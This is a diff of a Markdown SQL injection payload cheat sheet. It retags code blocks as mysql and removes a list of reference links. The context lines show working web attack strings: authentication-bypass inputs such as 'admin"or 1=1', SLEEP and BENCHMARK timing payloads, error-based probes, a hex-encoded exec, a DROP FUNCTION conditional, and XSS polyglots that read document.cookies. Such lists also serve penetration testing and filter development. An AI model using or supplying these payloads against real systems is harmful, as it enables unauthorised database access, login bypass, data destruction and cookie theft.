@@ -10,7 +10,7 @@ A SQL Injection attack consists of the insertion or injection of a SQL query via
 ##
 
 ###  Auth Bypass Payloads
-```
+```mysql
 %7C
 %27
 //*
@@ -142,7 +142,7 @@ admin"or 1=1 or ""="
 ```
 
 ### Time Based Payloads
-```
+```mysql
 SLEEP(5)#
 SLEEP(5)--
 SLEEP(5)="
@@ -245,7 +245,7 @@ SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
 ```
 
 ### Error Based Payloads
-```
+```mysql
 OR 1=1
 OR 1=0
 OR x=x
@@ -294,7 +294,7 @@ IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--
 ```
 
 ### Hash, Terminal & URL Payloads
-```
+```mysql
 ' or username like '%
 ' or uname like '%
 ' or userid like '%
@@ -540,7 +540,7 @@ declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)
 ```
 
 ### Dangerous Requests
-```
+```mysql
 ' OR '' = '
 
 ">/*-/*`/*\`/*'/*"/*%0D%0A%0d%0a*/<iframe/>
@@ -553,13 +553,3 @@ IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(
 
 /*-/*`/*\`/*'/*"/*%0D%0A%0d%0a*/(/* */oNcliCk=alert() )//</style>\x3ciframe/<iframe onload="alert(document.cookies)//">\x3e--!><iframe src=""><iframe/>
 ```
-
-## References & Other Resoureces
-MySQL:
-- http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
-- http://evilsql.com/main/page2.php
-- http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet
-- http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet
-- https://github.com/adamalston/SQL-Injection
-- https://github.com/xmendez/wfuzz
-
